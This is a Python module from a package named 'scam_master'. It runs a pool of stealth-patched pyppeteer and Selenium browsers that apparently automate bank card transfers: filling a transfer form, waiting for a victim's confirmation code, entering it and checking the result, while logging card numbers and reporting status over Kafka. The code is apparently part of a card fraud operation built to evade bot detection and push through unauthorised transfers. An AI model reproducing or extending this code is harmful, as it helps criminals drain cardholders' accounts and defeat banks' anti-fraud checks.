from asyncio import Lock, get_event_loop, create_task
from pyppeteer import launch
from pyppeteer.page import Page as PyppPage
from pyppeteer.browser import Browser as PyppBrowser
from pyppeteer_stealth import stealth as pypp_stealth
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver import Chrome, ChromeOptions
from datetime import datetime, timedelta
from loguru import logger

from scam_master.infrastructure.helpers.java_scripts import selenium_stealth
from scam_master.services.models.transactions import Transaction, Driver, Message, Topic, KafkaStatus, TransactionStatus
from scam_master.infrastructure.kafka_service import KafkaService
from config import BrowserConfig


class Browser:
    def __init__(self, transaction: Transaction, page: PyppPage | WebDriver, timeout: int = 350):
        self.transaction: Transaction = transaction
        self.page: PyppPage | WebDriver = page
        self.status: TransactionStatus = TransactionStatus.browser_creation
        self.created_at: datetime = datetime.now()
        self.timeout: int = timeout
    
    def set_status(self, status: TransactionStatus) -> None:
        self.status = status
                
        if status == TransactionStatus.filling_out_form:
            return logger.info(f'Filling out the transfer form... | id={self.transaction.id}')
        if status == TransactionStatus.confirmation_check:
            return logger.info(f'Check confirm transfer... | id={self.transaction.id}')
        if status == TransactionStatus.waiting_for_code:
            return logger.info(f'Waiting for confirmation code to be entered... | id={self.transaction.id}')
        if status == TransactionStatus.entering_code:
            return logger.info(f'Confirmation of transfer... | id={self.transaction.id}')
        if status == TransactionStatus.transfer_check:
            return logger.info(f'Check transfer status... | id={self.transaction.id}')


class BrowserManager:
    def __init__(self, kafka_service: KafkaService, browser_config: dict) -> None:
        self._config = BrowserConfig(browser_config)
        self._kafka_service: KafkaService = kafka_service
        self._pool: dict[str, Browser] = {}
        self._pool_lock: Lock = Lock()
    

    async def start(self, transaction: Transaction, driver: Driver, timeout: int = 350) -> Browser:
        logger.info(f'Browser creation... | id={transaction.id} | timeout={timeout}')

        async with self._pool_lock:
            if transaction.id in self._pool:
                self.stop(transaction.id)
        
        dr = await self._start_pyppeteer() if driver == Driver.pyppeteer else self._start_selenium()

        br = Browser(transaction, dr, timeout)

        async with self._pool_lock:
            self._pool[transaction.id] = br

        get_event_loop().call_later(timeout, create_task, self._timeout_stop(transaction.id))

        logger.info(f'Create transaction | id={transaction.id} | driver={driver} | gateway={transaction.bank_gateway} | sender={transaction.sender_bank} | amount={transaction.amount} | sender_card=*{transaction.sender_card.card_number[12:]} | rec_card=*{transaction.recipient_card_number[12:]}')
        return br
    

    async def get(self, transaction_id: str) -> Browser | None:
        async with self._pool_lock:
            return self._pool.get(transaction_id)


    async def stop(self, id: str) -> None:
        async with self._pool_lock:
            if id in self._pool:
                logger.info(f'Delete transaction | id={id}')
                dr = self._pool[id].page
                if isinstance(dr, PyppPage):
                    await dr.browser.close()
                elif isinstance(dr, WebDriver):
                    dr.close()
                del self._pool[id]


    async def _timeout_stop(self, id: str):
        browser = await self.get(id)
        if not browser:
            return
        
        logger.info(f'Timeout stop | id={id}')
        await self.stop(id)

        if browser.status == TransactionStatus.waiting_for_code:
            await self._kafka_service.send_message(
                Topic.transactions_status_changed,
                Message(id=id, status=KafkaStatus.failed)
            )

    async def _start_pyppeteer(self) -> PyppPage:
        browser: PyppBrowser = await launch(
            executablePath=self._config.PATH if self._config.PATH else None,
            headless=False,
            defaultViewport=False,
            width=1920,
            height=1080,
            dumpio=True,
            args=['--no-sandbox', '--disable-dev-shm-usage']
        )
        page: PyppPage = await browser.newPage()
        
        await pypp_stealth(page)

        return page
    
    
    def _start_selenium(self) -> WebDriver:
        options = ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        driver = Chrome(options=options)

        selenium_stealth(driver)

        return driver
